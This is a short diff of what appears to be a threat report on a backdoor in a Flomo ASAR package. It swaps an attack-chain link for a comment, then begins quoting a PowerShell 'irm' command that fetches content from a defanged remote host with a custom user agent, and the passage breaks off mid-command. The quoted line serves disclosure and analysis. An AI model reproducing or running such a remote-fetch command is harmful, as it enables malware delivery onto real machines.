@@ -28,7 +28,7 @@ IMPACT  : Remote JavaScript and arbitrary EXE execution
 
 ## Attack Chain
 
-**[Open the interactive attack chain](flomo-asar-backdoor-reuse-chain.html)**: click a step for its evidence and IOCs.
+<!-- chain -->
 
 ```
 (irm 'hxxps://xorados[.]com/h/8285426a1f3d36b5' -UserAgent 'WUA/49df7fcd6f'
